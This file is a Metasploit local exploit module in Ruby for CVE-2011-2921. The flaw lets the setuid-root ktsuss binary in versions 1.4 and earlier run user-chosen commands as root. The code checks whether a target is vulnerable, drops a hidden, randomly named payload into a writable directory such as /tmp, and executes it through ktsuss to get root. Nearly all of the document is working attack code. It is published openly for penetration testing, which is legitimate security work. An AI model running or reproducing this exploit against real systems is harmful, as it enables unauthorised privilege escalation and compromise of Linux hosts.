# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ktsuss suid Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges by exploiting
        a vulnerability in ktsuss versions 1.4 and prior.

        The ktsuss executable is setuid root and does not drop
        privileges prior to executing user specified commands,
        resulting in command execution with root privileges.

        This module has been tested successfully on:

        ktsuss 1.3 on SparkyLinux 6 (2019.08) (LXQT) (x64); and
        ktsuss 1.3 on SparkyLinux 5.8 (LXQT) (x64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;John Lightsey&#039;, # Discovery and exploit
          &#039;bcoles&#039;         # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;2011-08-13&#039;,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2011-2921&#039;],
          [&#039;URL&#039;, &#039;https://www.openwall.com/lists/oss-security/2011/08/13/2&#039;],
          [&#039;URL&#039;, &#039;https://security.gentoo.org/glsa/201201-15&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bcoles/local-exploits/blob/master/CVE-2011-2921/ktsuss-lpe.sh&#039;]
        ],
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           =>
        [
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;AppendExit&#039;       => true,
          &#039;PrependSetresuid&#039; => true,
          &#039;PrependSetresgid&#039; => true,
          &#039;PrependSetreuid&#039;  => true,
          &#039;PrependSetuid&#039;    => true,
          &#039;PrependFork&#039;      => true
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptString.new(&#039;KTSUSS_PATH&#039;, [true, &#039;Path to staprun executable&#039;, &#039;/usr/bin/ktsuss&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def ktsuss_path
    datastore[&#039;KTSUSS_PATH&#039;]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def check
    unless setuid? ktsuss_path
      vprint_error "#{ktsuss_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{ktsuss_path} is setuid"

    id = cmd_exec &#039;whoami&#039;
    res = cmd_exec("#{ktsuss_path} -u #{id} id").to_s
    vprint_status res

    unless res.include? &#039;uid=0&#039;
      return CheckCode::Safe
    end

    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    payload_name = ".#{rand_text_alphanumeric 10..15}"
    payload_path = "#{base_dir}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    print_status &#039;Executing payload ...&#039;
    id = cmd_exec &#039;whoami&#039;
    res = cmd_exec "#{ktsuss_path} -u #{id} #{payload_path} & echo "
    vprint_line res
  end
end

